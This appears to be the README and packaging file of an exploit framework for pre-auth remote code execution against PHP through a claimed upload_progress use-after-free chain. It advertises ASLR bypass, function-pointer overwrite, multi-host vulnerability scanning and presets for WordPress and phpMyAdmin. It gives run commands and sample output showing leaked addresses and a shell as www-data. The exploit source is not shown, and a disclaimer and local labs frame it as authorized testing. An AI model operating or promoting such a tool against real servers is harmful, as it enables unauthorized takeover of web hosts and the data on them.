# ArchonX-PHP2Shell

**ArchonX_DeadLock_Security**

Pre-auth remote code execution framework for PHP applications affected by
**CVE-2026-109618** and **CVE-2026-109619** — a `session.upload_progress`
use-after-free chain reachable over pure HTTP.

No credentials. No cookies. No prior foothold. Just a URL.
█████╗ ██████╗ ██████╗██╗ ██╗ ██████╗ ███╗ ██╗██╗ ██╗
██╔══██╗██╔══██╗██╔════╝██║ ██║██╔═══██╗████╗ ██║╚██╗██╔╝
███████║██████╔╝██║ ███████║██║ ██║██╔██╗ ██║ ╚███╔╝
██╔══██║██╔══██╗██║ ██╔══██║██║ ██║██║╚██╗██║ ██╔██╗
██║ ██║██║ ██║╚██████╗██║ ██║╚██████╔╝██║ ╚████║██╔╝ ██╗
╚═╝ ╚═╝╚═╝ ╚═╝ ╚═════╝╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝╚═╝ ╚═╝
ArchonX_DeadLock_Security

text

## What you get

- **Full-chain RCE** — ASLR bypass, function pointer overwrite, in-band shell
- **Advanced verbosity** — `-q` / default / `-v` / `-vv` — every allocation, every leak, every byte
- **Dual themes** — green-on-black (classic), red-on-black (DeadLock)
- **Multi-target mode** — scan a host list, report vulnerable targets
- **Chain visualizer** — live phase-by-phase progress
- **JSON reports** — machine-readable output for engagements
- **Presets** — `--preset wordpress`, `--preset phpmyadmin`, `--preset minimal`
- **Three labs** — bare PHP, WordPress, phpMyAdmin (docker-compose)

## Quick start

```bash
git clone https://github.com/<your-username>/ArchonX-PHP2Shell.git
cd ArchonX-PHP2Shell
pip install -e .
archonx --help
bash
# Bare PHP lab
docker compose -f labs/minimal/docker-compose.yml up -d
archonx -t http://127.0.0.1:18110/index.php --recon-only -v
archonx -t http://127.0.0.1:18110/index.php --cmd "id" -v
Sample verbose output
text
[archonx] ═══ PHASE 0: RECON ═══════════════════════════════════════
[archonx] → target ................. http://127.0.0.1:18110/index.php
[archonx] → HTTP probe ............. 200 OK
[archonx] → PHP version ............ 8.4.26 (via X-Powered-By)
[archonx] → SAPI ................... mod_php
[archonx] → MPM .................... prefork (single worker detected)
[archonx] → upload_progress ........ ACTIVE (session cookie set on probe)
[archonx] → vulnerable ............. YES
[archonx] ✓ phase complete (0.34s)

[archonx] ═══ PHASE 1: PROFILE LOOKUP ═════════════════════════════
[archonx] → matched profile ........ php-8.4.26-trixie-amd64 (verified)
[archonx] → zif_system ............. 0x465370
[archonx] → zval_ptr_dtor .......... 0x65eb60
[archonx] ✓ phase complete (0.01s)

[archonx] ═══ PHASE 3: EXPLOIT CHAIN ══════════════════════════════
[archonx] → try 1/5
[archonx] → A1 (OOM) ............... HTTP 500 ✓
[archonx] → B1 (leak) .............. 819200 bytes decoded
[archonx] → arch ................... x86_64
[archonx] → libphp base ............ 0x7f9a3c000000
[archonx] → A2 (dangling) .......... sent
[archonx] → B2 (spray) ............. payload fired
[archonx] ✓ in-band RCE — uid=33(www-data) gid=33(www-data)
Affected PHP versions
Branch	Vulnerable	Patched
8.5	< 8.5.12	8.5.12+
8.4	< 8.4.27	8.4.27+
8.3	< 8.3.36	8.3.36+
8.2	< 8.2.35	8.2.35+
8.1 / 8.0 / 7.x	all	EOL
Consult the official PHP advisories for CVE-2026-109618 and CVE-2026-109619.

Requirements
Python 3.10 or newer (stdlib only)

Docker + compose plugin (for the bundled labs)

License
MIT. See LICENSE.

Authorized use only
This tool is intended for authorized security testing, research, and
education. Running it against systems you do not own or have explicit
written permission to test is illegal in most jurisdictions.

text

---

## File 2 of 5 — `pyproject.toml`

```toml
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "archonx-php2shell"
version = "1.0.0"
description = "ArchonX-PHP2Shell — universal PHP RCE framework for CVE-2026-109618/619"
readme = "README.md"
requires-python = ">=3.10"
license = { text = "MIT" }
authors = [{ name = "ArchonX_DeadLock_Security" }]
keywords = [
    "security", "pentest", "php", "rce", "exploit",
    "cve-2026-109618", "cve-2026-109619",
]
classifiers = [
    "Programming Language :: Python :: 3",
    "Programming Language :: Python :: 3.10",
    "Programming Language :: Python :: 3.11",
    "Programming Language :: Python :: 3.12",
    "Topic :: Security",
    "License :: OSI Approved :: MIT License",
]

[project.scripts]
archonx = "archonx.cli:main"

[project.urls]
Homepage = "https://github.com/CHANGE_ME/ArchonX-PHP2Shell"
Repository = "https://github.com/CHANGE_ME/ArchonX-PHP2Shell"
Issues = "https://github.com/CHANGE_ME/ArchonX-PHP2Shell/issues"

[tool.setuptools]
packages = ["archonx"]

[tool.setuptools.package-data]
archonx = ["profiles/*.json"]
